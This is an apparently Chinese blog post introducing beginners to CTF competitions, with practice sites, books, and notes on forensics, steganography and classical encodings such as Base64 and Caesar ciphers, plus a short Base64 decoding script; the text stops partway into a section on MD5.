<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">



  <meta name="google-site-verification" content="QE52Rh63pUbENtc2T9VTpxeFXAc5pCVzwaz12vRSvZk">








  <meta name="baidu-site-verification" content="6YSqWvFIsY">







  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  
    
      
    

    
  

  

  
    
      
    

    
  

  
    
      
    

    
  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/panda32.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/panda32.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/panda16.png?v=5.1.4">


  <link rel="mask-icon" href="/images/panda.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="ctf,">










<meta name="keywords" content="ctf">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF入坑">
<meta property="og:url" content="https://7iny.jxustctf.top/CTF入坑.html">
<meta property="og:site_name" content="7iny">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/20190805.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080501.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080502.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/20190080503.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080504.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080505.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080506.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080508.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080509.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080510.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080507.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080619.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080601.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080602.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080603.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080604.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080605.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080606.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080607.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080608.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080609.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080610.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080611.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080701.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080702.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080704.png">
<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080703.png">
<meta property="og:updated_time" content="2019-08-07T10:10:38.384Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CTF入坑">
<meta name="twitter:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/20190805.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://7iny.jxustctf.top/CTF入坑.html">



<script>(function(T,h,i,n,k,P,a,g,e){g=function(){P=h.createElement(i);a=h.getElementsByTagName(i)[0];P.src=k;P.charset="utf-8";P.async=1;a.parentNode.insertBefore(P,a)};T["ThinkPageWeatherWidgetObject"]=n;T[n]||(T[n]=function(){(T[n].q=T[n].q||[]).push(arguments)});T[n].l=+new Date();if(T.attachEvent){T.attachEvent("onload",g)}else{T.addEventListener("load",g,false)}}(window,document,"script","tpwidget","//widget.seniverse.com/widget/chameleon.js"))</script>
<script>tpwidget("init", {
    "flavor": "bubble",
    "location": "WX4FBXXFKE4F",
    "geolocation": "enabled",
    "position": "top-left",
    "margin": "10px 10px",
    "language": "zh-chs",
    "unit": "c",
    "theme": "chameleon",
    "uid": "U888B80105",
    "hash": "3f2f5e4fc383bbbc8df2ab936a167264"
});
tpwidget("show");</script>



  <script>
  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
  daovoice('init', {
      app_id: "ace9b774"
    });
  daovoice('update');
  </script>


  <title>CTF入坑 | 7iny</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">7iny</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">Study well and make progress every day.</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-studylink">
          <a href="/studylink" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-battery"></i> <br>
            
            充电
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://7iny.jxustctf.top/CTF入坑.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="7iny">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/pandatou.jpeg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="7iny">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">CTF入坑</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-05T20:27:00+08:00">
                2019-08-05
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/总结/" itemprop="url" rel="index">
                    <span itemprop="name">总结</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  15.4k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  65
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/20190805.jpg" alt=""></p>
<a id="more"></a>
<h1 id="CTF学习"><a href="#CTF学习" class="headerlink" title="CTF学习"></a>CTF学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本内容主要以解题模式为学习重点，由Stalker-16成员(Danie1,7iny)整理。</p>
<h2 id="day01–7iny"><a href="#day01–7iny" class="headerlink" title="day01–7iny"></a>day01–7iny</h2><h3 id="解题模式CTF赛题目类别与能力对应"><a href="#解题模式CTF赛题目类别与能力对应" class="headerlink" title="解题模式CTF赛题目类别与能力对应"></a>解题模式CTF赛题目类别与能力对应</h3><p>· Web-Web应用的漏洞挖掘和利用<br>· PWN-逆向分析、漏洞挖掘、漏洞利用、安全编程<br>· Reverse Engineering-逆向分析、安全编程<br>· Crypto-密码、逆向分析、安全编程<br>· PPC（Professional Programming and Coding）-安全编程<br>· Forensic-网络流量分析、隐写分析、系统取证等<br>· Recon-社工、情报搜集分析</p>
<h3 id="相应的赛题要求"><a href="#相应的赛题要求" class="headerlink" title="相应的赛题要求"></a>相应的赛题要求</h3><p>PWN、Reverse偏重对汇编、逆向的理解<br>Crypto偏重对数学、算法的深入学习<br>Web偏重对技巧沉淀、快速搜索能力的挑战<br>Misc则更为复杂，所有与计算机安全挑战有关的都算在其中</p>
<h3 id="如何入门–如何学？"><a href="#如何入门–如何学？" class="headerlink" title="如何入门–如何学？"></a>如何入门–如何学？</h3><p>1、恶补基础知识（有基础的跳过此步）</p>
<blockquote>
<p>都需要学的内容：<br>Linux基础、计算机组成原理、操作系统原理、网络协议分析<br>PWN+Reverse+Crypto随机搭配：<br>IDA工具使用（f5插件）、逆向工程、密码学、缓冲区溢出等<br>Web+Misc组合：<br>网络安全、内网渗透、数据库安全等</p>
</blockquote>
<p>2、尝试从脑洞开始（hackgame）</p>
<blockquote>
<p>1.<a href="https://prompt.ml/0" rel="external nofollow" target="_blank">xss练习平台</a></p>
<p>2.<a href="https://redtiger.labs.overthewire.org/" rel="external nofollow" target="_blank">sql注入挑战</a></p>
</blockquote>
<p>3、从基础题目出发</p>
<blockquote>
<p>刷题站点：</p>
<p>1.<a href="https://www.ichunqiu.com" rel="external nofollow" target="_blank">i春秋</a> </p>
<p>2.<a href="https://adworld.xctf.org.cn/" rel="external nofollow" target="_blank">xctf攻防世界</a></p>
<p>3.<a href="http://www.wechall.net/challs" rel="external nofollow" target="_blank">国外CTF题库</a></p>
<p>4.<a href="https://microcorruption.com/login" rel="external nofollow" target="_blank">国外PWN+Reverse方向</a></p>
<p>5.<a href="https://smashthestack.org/" rel="external nofollow" target="_blank">ssh连接玩wargame</a></p>
<p>6.<a href="https://overthewire.org/wargames/" rel="external nofollow" target="_blank">老牌wargame</a></p>
<p>7.<a href="https://pwnable.kr/play.php" rel="external nofollow" target="_blank">pwn题库</a></p>
</blockquote>
<p>4、学习信息安全专业知识</p>
<blockquote>
<p>书籍</p>
<p>PWN+Reverse+Crypto随机搭配：<br>RE for Beginners（逆向工程入门）<br>IDA Pro权威指南<br>揭秘家庭路由器0day漏洞挖掘技术<br>自己动手写操作系统<br>黑客攻防技术宝典：系统实战篇</p>
<p>Web+Misc组合：<br>Web应用安全权威指南<br>Web前端黑客技术揭秘<br>黑客秘籍-渗透测试实用指南<br>黑客攻防技术宝典Web实战篇<br>代码审计：企业级Web代码安全架构</p>
</blockquote>
<p>5、锻炼体力而耐力</p>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><blockquote>
<p>以下是由各大大佬整理的工具库，全部放在了github上</p>
<p>1.<a href="https:/github.com/truongkma/ctf-tools" target="_blank" rel="noopener">工具库1</a> </p>
<p>2.<a href="https://github.com/zardus/ctf-tools" rel="external nofollow" target="_blank">工具库2</a></p>
<p>3.<a href="https:/github.com/TUCTF/Tools" target="_blank" rel="noopener">工具库3</a></p>
</blockquote>
<h3 id="MISC学习"><a href="#MISC学习" class="headerlink" title="MISC学习"></a>MISC学习</h3><p>学习MISC的好处：MISC可能是切入CTF竞赛领域、培养兴趣的最佳入口<br>1.基础知识/技能面、逆向思维<br>2.“解谜”能力、“脑洞”大开</p>
<p>1.国外：Google Map、Earth、Street View<br>2.国内：Baidu地图、卫星视图、全景视图：map.baidu.com腾讯地图、卫星、街景：map.qq.com<br>· 从网络世界到物理世界<br>1.IP2Location IP地址（因特网上的虚拟地址）&gt;现实世界中的具体地理位置<br>2.IP2Location数据库：WHOIS数据库，GeolP，IP2Location，纯真数据库（QQIP查询使用）<br>· Google image search<br>1.搜索图片含义和外观类似图片</p>
<p>2.Encoding Analysis 编码分析<br>· 二进制编码<br>· 十六进制编码<br>1.单字节：00-FF·ASClI字符编码<br>2.字母：A-Z：41-5A；a-Z：61-7A<br>· Base64编码<br>1.基于64个可打印字符来表示二进制数据的表示方法<br>2.字符集：大小写字母各26个，10个数字，加号“+”，斜杠“/”，一共64个字符，等号“=”用来作为后缀用途<br>· Huffman Code-无损压缩编码，01串显示<br>· 条形码：宽度不等的多个黑条和空白，按照一定的编码规则排列，用以表达一组信息的图形标识符<br>·国际标准</p>
<ul>
<li>EAN-13：商品条码标准，13位数字</li>
<li>Code-39：39字符</li>
<li>Code-128：128字符<br>·条形码</li>
<li>在线条码生成器/识别器</li>
<li>ZXing-多平台条形码生成、扫码库<br>条形码在线解码：<a href="https://online-barcode-reader.inliteresearch.com/" rel="external nofollow" target="_blank">网站</a><br>题目1：Barcode.jpeg<br>· 二维码：用某种特定几何图形按一定规律在平面（二维方向上）分布的黑白相间的图形记录数据符号信息<br>1.堆叠式/行排式二维条码：Code 16K、Code49、PDF417<br>2.矩阵式二维码：QR CODE<blockquote>
<p>常见题目二维码、条形码的恢复<br>参考文章：<a href="https://www.freebuf.com/geek/204516.html" rel="external nofollow" target="_blank">freebuf</a><br>练习平台：<a href="http://daka.whaledu.com:9999/" rel="external nofollow" target="_blank">蓝鲸安全打卡练习场</a><br>参考writeup:<a href="https://www.jianshu.com/p/27b8be64811e" rel="external nofollow" target="_blank">简书</a></p>
</blockquote>
</li>
</ul>
<p>练习蓝鲸安全打卡练习场题目：<br>1.破碎的心–画图按住ctrl，按上下键不断还原<br>2.黑白打字机–画图ctrl+shift+i反色，图片隐写解密，86版五笔对照表</p>
<blockquote>
<p>图片隐写解密软件<a href="http://www.oyksoft.com/soft/19151.html" rel="external nofollow" target="_blank">下载地址</a></p>
</blockquote>
<p>3.Forensic Analysis 取证分析</p>
<p>· 取证分析-取证对象<br>1.文件file<br>2.磁盘disk<br>3.网络数据包pcap<br>4.内存dump<br>5.系统镜像image<br>· 取证分析挑战目标<br>1.一般为发现在取证对象中隐藏的Flag（代表要取证的敏感信息）<br>2.取证分析通常和隐写分析联系在一起<br>· 文件格式分析常用命令和工具<br>1.基本命令file、identify、strings：用于文件类型探测<br>2.winhex、UE：用于直接察看文件16进制数据<br>3.binwalk：分析二进制文件，提取其中隐藏文件等<br>· 需要了解常见文件特征串<br>1.<a href="http://en.wikipedia.org/wiki/List" rel="external nofollow" target="_blank">http://en.wikipedia.org/wiki/List</a> of file signatures<br>2.特别是JPEG、PNG、GIF、BMP等图片文件，ZIP、RAR、TAR、7z等压缩文件，mp3、wma、avi等音视频文件</p>
<p>音频取证<br>· <a href="https://iboxgalileogiftedschoolor-my.sharepoint.com/personal/wangshusong_auooo_com/_layouts/15/guestaccess.aspx?docid=0f7d6900c9d0e49f6847482800cec4f0c&amp;authkey=AZdJzcQaggeMsOlvhXc-cZs&amp;e=zV8BNd" rel="external nofollow" target="_blank">Audacity</a>音频处理软件，查看声音波形</p>
<p><a href="https://www.sqlsec.com/2018/01/ctfwav.html" rel="external nofollow" target="_blank">国光音频取证总结</a></p>
<p>磁盘取证<br>· 磁盘分区格式<br>1.Windows:FAT12-&gt;FAT16-&gt;FAT32-&gt;NTFS<br>2.Linux:EXT2-&gt;EXT3-&gt;EXT4<br>3.FAT主磁盘结构</p>
<p>| 主引导区 | 文件分配表#1 | 文件分配表#2 | 根目录 | 其他所有数据剩下磁盘空间 |</p>
<p>删除文件<br>·目录表中文件名第一字节E5<br>·文件恢复和取证工具<br>EasyRecovery、MedAnalyze、FTK<br>网络数据包Pcap取证分析<br>· Wireshark工具<br>书籍《Wireshark抓包分析实战》<br>· 流量统计和会话列表<br>· 善用过滤规则，找出关注的网络流纪录<br>· 流重组：Follow TCP Stream<br>· 常见网络通信协议的理解<br>IP/TCP、UDP/HTTP、DNS、.….<br>·提取流中的文件数据</p>
<p>内存与image镜像取证分析<br>· 内存取证<br>1.Volatility内存镜像分析工具<br>2.解析Windows/Linux/MacOSX内存结构<br>3.分析当前运行进程列表、进程内存数据等<br>4.根据题目提示寻找线索和思路，提取分析指定进程的特定内存数据<br>· Image镜像取证<br>1.Binwalk<br>2.根据题目提示提取镜像中需关注的文件<br>3.分析提取文件中的应用层数据</p>
<p>4.Steganalysis 隐写分析</p>
<p>隐写术<br>· 隐写载体<br>1.文本<br>2.图片<br>3.音频<br>4.视频<br>· 隐写方法和工具<br>1.RSD、LSB、DCT<br>2.<a href="https://en.wikipedia.org/wiki/Steganography_tools" rel="external nofollow" target="_blank">https://en.wikipedia.org/wiki/Steganography_tools</a></p>
<p><a href="https://www.sqlsec.com/2018/01/ctfimg.html" rel="external nofollow" target="_blank">国光图片隐写总结</a></p>
<p>· 识别隐写<br>1.统计分析<br>2.Noise floor consistency analysis 噪声一致性分析<br>· 隐写识别工具<br>1.Stegdetect<br>2.StegSecret<br>3.GFE Stealth<br>· 隐写分析<br>1.<a href="http://www.garykessler.net/library/fsc_stego.html" rel="external nofollow" target="_blank">http://www.garykessler.net/library/fsc_stego.html</a></p>
<h2 id="day01–Danie1"><a href="#day01–Danie1" class="headerlink" title="day01–Danie1"></a>day01–Danie1</h2><hr>
<p>MISC(Miscellaneous)类型，即安全杂项，题目或涉及流量分析、电子取证、人肉搜索、数据分析等等。</p>
<p>例题<code>day01.zip</code>下载网盘<a href="https://pan.baidu.com/s/1P_dQTLxLwdA1anIGdgWqZw" rel="external nofollow" target="_blank">链接</a> 提取码: fjru</p>
<h3 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h3><hr>
<h4 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h4><ul>
<li>例：  ..-. .-.. .- –. .—- ..— …– ….- ….. -…. </li>
<li><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" rel="external nofollow" target="_blank">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></li>
</ul>
<h4 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h4><ul>
<li><p>它是一种替换加密的技术，<a href="https://baike.baidu.com/item/%E6%98%8E%E6%96%87" rel="external nofollow" target="_blank">明文</a>中的所有字母都在<a href="https://baike.baidu.com/item/%E5%AD%97%E6%AF%8D%E8%A1%A8" rel="external nofollow" target="_blank">字母表</a>上向后（或向前）按照一个固定数目进行偏移后被替换成<a href="https://baike.baidu.com/item/%E5%AF%86%E6%96%87" rel="external nofollow" target="_blank">密文</a>。</p>
</li>
<li><p>例： iodj{dvgi}</p>
</li>
<li><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php" rel="external nofollow" target="_blank">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></li>
</ul>
<h4 id="base编码"><a href="#base编码" class="headerlink" title="base编码"></a>base编码</h4><ul>
<li><p>base16:</p>
<p>Base16编码就是将ASCII字符集中可打印的字符(数字0~9和字母A~F)对应的二进制字节数据进行编码</p>
</li>
<li><p>编码的方式: 根据ASCII编码得到对应的二进制,将所有二进制串起来,然后按4个二进制位分割,转化成十进制数值,根据Base16编码表得到编码</p>
</li>
<li><p>例将”ILU”字符串加密</p>
</li>
<li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080501.png" alt=""></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080502.png" alt=""></p>
</li>
</ul>
<ul>
<li><p>base32:</p>
<p>与Base16编码区别的是,Base32使用了ASCII编码中可打印的32个字符(大写字母A~Z和数字2~7)对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组,由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位,则在编码后数据补充”=”</p>
</li>
<li><p>编码方式：先根据ASCII编码得到对应字符编码值以及对应二进制,将所有二进制串起来,然后按照5个二进制位为一组分割 ,得到十进制值=&gt;找到Base32编码表找到对应的字符.案例总共分割成了5组(25位),还差三组(15位).在末尾补充3个”=”.</p>
</li>
<li>例将”ILU”字符串加密</li>
<li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/20190080503.png" alt=""></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080504.png" alt=""></p>
</li>
</ul>
<ul>
<li><p>base64:</p>
<p>Base64编码使用了ASCII编码中64个可打印的字符(大写字母A~Z,小写字母a~z,数字0~9以及”+”,”/“)将任意字节数据进行编码.Base64编码将串起来的二进制以6位进行分割.所以分切之前的二进制位数应该是24的倍数(即6,8的最小公倍数).如果不足24位,则在编码后数据后面添加”=”</p>
</li>
<li><p>编码方式：先根据ASCII编码得到对应字符编码值以及对应二进制，将串起来的二进制按6位分为一组.得到4组(24位).所以末尾不用补充”=”</p>
</li>
<li>例将”ILU”字符串加密</li>
<li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080505.png" alt=""></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080506.png" alt=""></p>
</li>
</ul>
<ul>
<li><p>题目</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MzQ0MTM1MzYzNDQ1MzQzNjM0NDYzNTMyMzMzMjM0MzQzNDQzMzQzOTM1NDEzNTM0MzQzNzM1MzQzNDQyMzQzNzM0NDMzNDQxMzQ0MzM1MzUzNTMzMzUzNzM1MzMzNTM1MzQ0MTM0MzIzNDM4MzQzNTM0MzUzNDQ1MzUzMzM1MzIzNDM4MzUzNTMzMzYzNTM0MzMzMjM1MzAzNDM5MzM0NA==</span><br><span class="line"></span><br><span class="line">flag格式：flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bs</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        ok = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s1 = base64.b64decode(s).decode(<span class="string">'ascii'</span>)</span><br><span class="line">            ok = <span class="number">1</span></span><br><span class="line">            s=s1</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s2 = base64.b32decode(s).decode(<span class="string">'ascii'</span>)</span><br><span class="line">            ok = <span class="number">1</span></span><br><span class="line">            s=s2</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s3 = base64.b16decode(s).decode(<span class="string">'ascii'</span>)</span><br><span class="line">            ok = <span class="number">1</span></span><br><span class="line">            s=s3</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ok == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span>  s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    s = raw_input(<span class="string">"请输入字符串:"</span>)</span><br><span class="line">    res = bs(s)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---------------------------'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'result:'</span>+ res</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="ascii编码"><a href="#ascii编码" class="headerlink" title="ascii编码"></a>ascii编码</h3><ul>
<li><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080508.png" alt=""></li>
</ul>
<h3 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h3><p>  例：<code>&amp;#102;&amp;#108;&amp;#97;&amp;#103;</code></p>
<ul>
<li><a href="http://tool.chinaz.com/tools/unicode.aspx" rel="external nofollow" target="_blank">http://tool.chinaz.com/tools/unicode.aspx</a></li>
</ul>
<h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><ul>
<li><p>MD5即Message-Digest Algorithm 5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一</p>
</li>
<li><p>加密</p>
<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080509.png" alt=""></p>
</li>
